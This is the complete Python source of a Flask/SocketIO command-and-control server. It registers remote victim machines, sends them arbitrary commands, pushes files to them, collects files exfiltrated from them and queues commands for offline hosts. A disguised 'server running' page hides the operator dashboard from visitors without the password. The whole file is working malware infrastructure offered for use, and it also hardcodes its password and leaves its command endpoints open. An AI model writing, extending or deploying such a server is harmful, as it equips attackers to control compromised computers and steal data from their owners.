#!/usr/bin/env python3
"""
C2 SERVER - Secured (No Public Dashboard)
Features: Multiple clients, Command execution, File upload/download
"""

from flask import Flask, request, jsonify, send_file, render_template_string
from flask_socketio import SocketIO, emit, join_room
from flask_cors import CORS
import os
import json
import base64
import hashlib
import time
from datetime import datetime
import secrets
import threading
from collections import defaultdict
from functools import wraps

app = Flask(__name__)
CORS(app)
app.config['SECRET_KEY'] = secrets.token_hex(32)
app.config['MAX_CONTENT_LENGTH'] = 500 * 1024 * 1024  # 500MB

# Storage
os.makedirs('uploads', exist_ok=True)
os.makedirs('downloads', exist_ok=True)

# SocketIO with threading
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# In-memory storage
clients = {}
client_sockets = {}
command_results = {}
pending_commands = defaultdict(list)

# Password for dashboard access
DASHBOARD_PASSWORD = "C2RICARDO"

print("""
╔══════════════════════════════════════════════════════════════╗
║                   C2 SERVER v2.0 SECURED                     ║
║              No Public Dashboard • Password Protected        ║
╚══════════════════════════════════════════════════════════════╝
""")

# ============= PASSWORD PROTECTION =============

def check_password():
    """Check if password is correct"""
    password = request.args.get('password', '') or request.form.get('password', '')
    auth_header = request.headers.get('Authorization', '')
    
    # Check query param, form data, or Bearer token
    if password == DASHBOARD_PASSWORD:
        return True
    if auth_header == f"Bearer {DASHBOARD_PASSWORD}":
        return True
    return False

def require_password(f):
    """Decorator to require password for routes"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not check_password():
            return jsonify({'error': 'Unauthorized', 'message': 'Invalid or missing password'}), 401
        return f(*args, **kwargs)
    return decorated_function

# ============= WEB ROUTES =============

@app.route('/')
def index():
    """Locked homepage - shows nothing publicly"""
    # Check if password provided
    if check_password():
        html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>C2 Server - Secured</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: 'Consolas', monospace;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
            color: #00ff00;
            padding: 20px;
            min-height: 100vh;
        }}
        .container {{ max-width: 1200px; margin: 0 auto; }}
        h1 {{ text-align: center; margin: 20px 0; text-shadow: 0 0 10px #00ff00; }}
        .stats {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }}
        .stat-box {{
            background: rgba(0, 255, 0, 0.1);
            border: 2px solid #00ff00;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
        }}
        .stat-number {{ font-size: 3em; font-weight: bold; }}
        .stat-label {{ margin-top: 10px; opacity: 0.8; }}
        .info {{
            background: rgba(0, 255, 0, 0.05);
            border: 1px solid #00ff00;
            padding: 20px;
            border-radius: 10px;
            margin-top: 20px;
        }}
        .info h3 {{ margin-bottom: 15px; }}
        code {{ color: #00ff00; background: rgba(0, 0, 0, 0.5); padding: 2px 6px; border-radius: 3px; }}
        .pulse {{ animation: pulse 2s infinite; }}
        @keyframes pulse {{ 0%, 100% {{ opacity: 1; }} 50% {{ opacity: 0.5; }} }}
        .locked {{ color: #ff0000; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🔓 C2 SERVER UNLOCKED <span class="pulse">●</span></h1>
        
        <div class="stats">
            <div class="stat-box">
                <div class="stat-number" id="total">0</div>
                <div class="stat-label">Total Clients</div>
            </div>
            <div class="stat-box">
                <div class="stat-number" id="online">0</div>
                <div class="stat-label">Online Now</div>
            </div>
            <div class="stat-box">
                <div class="stat-number" id="commands">0</div>
                <div class="stat-label">Commands Executed</div>
            </div>
        </div>
        
        <div class="info">
            <h3>🎮 USE CONSOLE TO CONTROL</h3>
            <p>Run: <code>python console.py</code></p>
            <p>Dashboard is for monitoring only - use console for commands</p>
        </div>
    </div>
    
    <script>
        async function updateStats() {{
            try {{
                const res = await fetch('/api/stats?password={DASHBOARD_PASSWORD}');
                const data = await res.json();
                document.getElementById('total').textContent = data.total || 0;
                document.getElementById('online').textContent = data.online || 0;
                document.getElementById('commands').textContent = data.commands || 0;
            }} catch(e) {{}}
        }}
        updateStats();
        setInterval(updateStats, 3000);
    </script>
</body>
</html>
        """
        return html
    else:
        # Show locked page
        return """
<!DOCTYPE html>
<html>
<head>
    <title>Server Running</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: monospace;
            background: #000;
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .status {
            text-align: center;
            font-size: 14px;
            opacity: 0.3;
        }
        .dot {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #333;
            border-radius: 50%;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 0.3; }
            50% { opacity: 0.6; }
        }
    </style>
</head>
<body>
    <div class="status">
        <span class="dot"></span>
        <div style="margin-top: 10px;">server running</div>
    </div>
</body>
</html>
        """, 200

@app.route('/api/stats')
@require_password
def get_stats():
    """Get server statistics - requires password"""
    online = sum(1 for c in clients.values() if c.get('online', False))
    return jsonify({
        'total': len(clients),
        'online': online,
        'commands': len(command_results),
        'timestamp': time.time()
    })

@app.route('/api/clients')
def api_clients():
    """Get all clients - NO PASSWORD (needed for console)"""
    client_list = []
    for client_id, client in clients.items():
        client_list.append({
            'id': client_id,
            'hostname': client.get('hostname', 'Unknown'),
            'username': client.get('username', 'Unknown'),
            'os': client.get('os', 'Unknown'),
            'platform': client.get('platform', 'Unknown'),
            'ip': client.get('ip', 'Unknown'),
            'online': client.get('online', False),
            'last_seen': client.get('last_seen', 0)
        })
    return jsonify(client_list)

@app.route('/api/command', methods=['POST'])
def send_command():
    """Send command to client - NO PASSWORD (needed for console)"""
    data = request.get_json()
    client_id = data.get('client_id')
    command = data.get('command')
    
    if not client_id or not command:
        return jsonify({'error': 'Missing client_id or command'}), 400
    
    if client_id not in clients:
        return jsonify({'error': 'Client not found'}), 404
    
    # Generate command ID
    cmd_id = f"cmd_{int(time.time())}_{secrets.token_hex(4)}"
    
    # Create command object
    cmd_obj = {
        'id': cmd_id,
        'command': command,
        'timestamp': time.time(),
        'status': 'pending'
    }
    
    # Send to client if online
    if client_id in client_sockets:
        socketio.emit('command', cmd_obj, room=client_sockets[client_id])
        return jsonify({'status': 'sent', 'command_id': cmd_id})
    else:
        # Queue for later
        pending_commands[client_id].append(cmd_obj)
        return jsonify({'status': 'queued', 'command_id': cmd_id})

@app.route('/api/result/<cmd_id>')
def get_result(cmd_id):
    """Get command result - NO PASSWORD (needed for console)"""
    if cmd_id in command_results:
        return jsonify(command_results[cmd_id])
    else:
        return jsonify({'status': 'pending', 'output': None})

@app.route('/api/upload', methods=['POST'])
def upload_file():
    """Upload file to send to client - NO PASSWORD (needed for console)"""
    client_id = request.form.get('client_id')
    destination = request.form.get('destination', '')
    
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    
    if client_id not in clients:
        return jsonify({'error': 'Client not found'}), 404
    
    # Save file
    file_id = f"upload_{int(time.time())}_{secrets.token_hex(4)}"
    file_path = os.path.join('uploads', file_id)
    file.save(file_path)
    
    # Read and encode file
    with open(file_path, 'rb') as f:
        file_data = base64.b64encode(f.read()).decode('utf-8')
    
    # Create upload command
    cmd_obj = {
        'id': file_id,
        'type': 'upload',
        'filename': file.filename,
        'destination': destination,
        'filedata': file_data,
        'size': os.path.getsize(file_path)
    }
    
    # Send to client
    if client_id in client_sockets:
        socketio.emit('command', cmd_obj, room=client_sockets[client_id])
        return jsonify({'status': 'sent', 'file_id': file_id})
    else:
        pending_commands[client_id].append(cmd_obj)
        return jsonify({'status': 'queued', 'file_id': file_id})

@app.route('/api/download/<file_id>')
def download_file(file_id):
    """Download file from server - NO PASSWORD (needed for console)"""
    file_path = os.path.join('downloads', file_id)
    if os.path.exists(file_path):
        return send_file(file_path, as_attachment=True)
    else:
        return jsonify({'error': 'File not found'}), 404

# ============= WEBSOCKET EVENTS =============

@socketio.on('connect')
def handle_connect():
    """Handle client connection"""
    print(f"[+] Connection: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    """Handle client disconnect"""
    # Find and mark client as offline
    for client_id, socket_id in list(client_sockets.items()):
        if socket_id == request.sid:
            if client_id in clients:
                clients[client_id]['online'] = False
                clients[client_id]['last_seen'] = time.time()
            del client_sockets[client_id]
            print(f"[-] Client offline: {client_id[:8]}")
            socketio.emit('client_offline', {'client_id': client_id}, namespace='/')
            break

@socketio.on('register')
def handle_register(data):
    """Client registers with server"""
    client_id = data.get('id')
    
    if not client_id:
        unique = f"{data.get('hostname', '')}{data.get('username', '')}{data.get('os', '')}"
        client_id = hashlib.sha256(unique.encode()).hexdigest()[:16]
    
    # Store client info
    clients[client_id] = {
        'id': client_id,
        'hostname': data.get('hostname', 'Unknown'),
        'username': data.get('username', 'Unknown'),
        'os': data.get('os', 'Unknown'),
        'platform': data.get('platform', 'Unknown'),
        'ip': request.remote_addr,
        'online': True,
        'first_seen': clients.get(client_id, {}).get('first_seen', time.time()),
        'last_seen': time.time()
    }
    
    # Map socket to client
    client_sockets[client_id] = request.sid
    join_room(client_id)
    
    print(f"[+] Client online: {client_id[:8]} - {data.get('hostname')} ({data.get('platform')})")
    
    # Send welcome
    emit('welcome', {
        'client_id': client_id,
        'message': 'Connected to C2 Server',
        'timestamp': time.time()
    })
    
    # Notify consoles
    socketio.emit('client_online', {
        'client_id': client_id,
        'hostname': data.get('hostname'),
        'platform': data.get('platform')
    }, namespace='/')
    
    # Send any pending commands
    if client_id in pending_commands and pending_commands[client_id]:
        for cmd in pending_commands[client_id]:
            emit('command', cmd)
        pending_commands[client_id].clear()

@socketio.on('heartbeat')
def handle_heartbeat(data):
    """Handle client heartbeat"""
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        clients[client_id]['last_seen'] = time.time()
        clients[client_id]['online'] = True
        emit('heartbeat_ack', {'timestamp': time.time()})

@socketio.on('result')
def handle_result(data):
    """Handle command result from client"""
    cmd_id = data.get('command_id')
    client_id = data.get('client_id')
    
    output_len = len(data.get('output', ''))
    print(f"[*] Result: {cmd_id[:12]} from {client_id[:8]} ({output_len} chars)")
    
    # Store result
    command_results[cmd_id] = {
        'command_id': cmd_id,
        'client_id': client_id,
        'command': data.get('command', ''),
        'output': data.get('output', ''),
        'success': data.get('success', True),
        'status': data.get('status', 'completed'),
        'timestamp': time.time()
    }
    
    # Notify all consoles
    socketio.emit('command_result', command_results[cmd_id], namespace='/')
    socketio.emit('result_ready', command_results[cmd_id], room=client_id, namespace='/')

@socketio.on('file_download')
def handle_file_download(data):
    """Handle file download from client"""
    file_id = data.get('file_id')
    filename = data.get('filename', 'downloaded_file')
    filedata = data.get('filedata')
    
    if filedata:
        file_bytes = base64.b64decode(filedata)
        file_path = os.path.join('downloads', file_id)
        
        with open(file_path, 'wb') as f:
            f.write(file_bytes)
        
        print(f"[+] File received: {filename} ({len(file_bytes)} bytes)")
        
        socketio.emit('file_ready', {
            'file_id': file_id,
            'filename': filename,
            'size': len(file_bytes)
        }, namespace='/')

@socketio.on('console_connect')
def handle_console_connect(data):
    """Console connects for updates"""
    print(f"[+] Console connected: {request.sid[:8]}")
    emit('console_ready', {'message': 'Connected to C2 server'})

# ============= MAIN =============

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    
    print(f"[*] Server listening on port {port}")
    print(f"[*] Dashboard password: {DASHBOARD_PASSWORD}")
    print(f"[*] Access dashboard: http://localhost:{port}?password={DASHBOARD_PASSWORD}")
    print(f"[*] API endpoints: Open (no password needed for console)")
    print(f"[*] Public view: Minimal 'server running' message")
    print()
    
    socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)
